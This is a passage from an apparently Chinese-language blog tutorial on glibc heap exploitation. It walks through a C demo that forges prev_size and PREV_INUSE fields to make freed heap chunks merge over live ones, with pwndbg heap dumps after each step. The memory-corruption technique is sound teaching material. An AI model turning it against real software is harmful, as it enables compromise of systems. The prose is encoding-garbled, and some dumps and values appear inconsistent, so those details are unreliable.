class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000061</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000020f81</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹å freeï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758080</span><br><span class="line">Size: 0x20f81</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000061</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000020f81</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åé‡æ–° mallocï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758080</span><br><span class="line">Size: 0x20f81</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000061</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000020f81</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><h2 id="5-é€šè¿‡extendå‰å‘overlapping"><a class="markdownIt-Anchor" href="#5-é€šè¿‡extendå‰å‘overlapping">#</a> 5ã€é€šè¿‡ extend å‰å‘ overlappingï¼š</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g 5.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr1,*ptr2,*ptr3,*ptr4;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin1</span></span><br><span class="line">    ptr2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin1</span></span><br><span class="line">    ptr3=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin2</span></span><br><span class="line">    ptr4=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//é˜²æ­¢ä¸topåˆå¹¶</span></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    *(<span class="type">int</span> *)((<span class="type">long</span> <span class="type">long</span>)ptr4<span class="number">-0x8</span>)=<span class="number">0x90</span>;<span class="comment">//ä¿®æ”¹pre_inuseåŸŸ</span></span><br><span class="line">    *(<span class="type">int</span> *)((<span class="type">long</span> <span class="type">long</span>)ptr4<span class="number">-0x10</span>)=<span class="number">0xd0</span>;<span class="comment">//ä¿®æ”¹pre_sizeåŸŸ</span></span><br><span class="line">    <span class="built_in">free</span>(ptr4);<span class="comment">//unlinkè¿›è¡Œå‰å‘extend</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x150</span>);<span class="comment">//å ä½å—</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ç»è¿‡äº”æ¬¡ malloc ä¹‹åï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758090</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580b0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580d0</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758160</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758180</span><br><span class="line">Size: 0x20e81</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/54gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000091</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000091</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580f0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758100: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758110: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758120: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758130: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758140: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758150: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758160: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758170: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758180: 0x0000000000000000  0x0000000000020e81</span><br><span class="line">0x555555758190: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557581a0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹free äº† chunk1 ä¹‹åï¼Œchunk2 çš„ p ä½å·²ç»å˜æˆ 0 äº†ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x91</span><br><span class="line">fd: 0x7ffff7dd1b78</span><br><span class="line">bk: 0x7ffff7dd1b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555555758090</span><br><span class="line">Size: 0x20</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580b0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580d0</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758160</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758180</span><br><span class="line">Size: 0x20e81</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555758000 â€”â–¸ 0x7ffff7dd1b78 (main_arena+88) â—‚â€” 0x555555758000</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/54gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000091&lt;======Chunk1</span><br><span class="line">0x555555758010: 0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000090  0x0000000000000020</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000021&lt;======Chunk2</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000091&lt;======Chunk3</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580f0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758100: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758110: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758120: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758130: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758140: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758150: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758160: 0x0000000000000000  0x0000000000000021&lt;======Chunk4</span><br><span class="line">0x555555758170: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758180: 0x0000000000000000  0x0000000000020e81&lt;======Top Chunk</span><br><span class="line">0x555555758190: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557581a0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åä¿®æ”¹äº† chunk3 çš„ pre_inuseï¼Œä¹Ÿå°±æ˜¯ size çš„æœ€ä½ä¸º P ä½ä¸º 0ï¼Œç„¶åä¿®æ”¹ pre_size ä½ä¸º 0xd8ï¼Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x91</span><br><span class="line">fd: 0x7ffff7dd1b78</span><br><span class="line">bk: 0x7ffff7dd1b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555555758090</span><br><span class="line">Size: 0x20</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580b0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5555557580d0</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758160</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758180</span><br><span class="line">Size: 0x20e81</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555758000 â€”â–¸ 0x7ffff7dd1b78 (main_arena+88) â—‚â€” 0x555555758000</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/54gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000091&lt;======Chunk1</span><br><span class="line">0x555555758010: 0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000090  0x0000000000000020</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000021&lt;======Chunk2</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x00000000000000d0  0x0000000000000090&lt;======Chunk3</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580f0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758100: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758110: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758120: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758130: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758140: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758150: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758160: 0x0000000000000000  0x0000000000000021&lt;======Chunk4</span><br><span class="line">0x555555758170: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758180: 0x0000000000000000  0x0000000000020e81&lt;======Top Chunk</span><br><span class="line">0x555555758190: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557581a0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹å¯ä»¥çœ‹å‡ºæ¥ï¼Œchunk3 çš„ pre_size åŸŸçš„å¤§å°åˆšå¥½èƒ½å¤ŸåŒ…å«åˆ°å®Œ chunk1 å’Œ chunk2ã€‚ä¹‹å free æ‰äº† chunk3ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x161</span><br><span class="line">fd: 0x7ffff7dd1b78</span><br><span class="line">bk: 0x7ffff7dd1b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555555758160</span><br><span class="line">Size: 0x20</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758180</span><br><span class="line">Size: 0x20e81</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555758000 â€”â–¸ 0x7ffff7dd1b78 (main_arena+88) â—‚â€” 0x555555758000</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>ä¼šå‘ç°ï¼Œå‰é¢çš„ä¸‰ä¸ª chunk 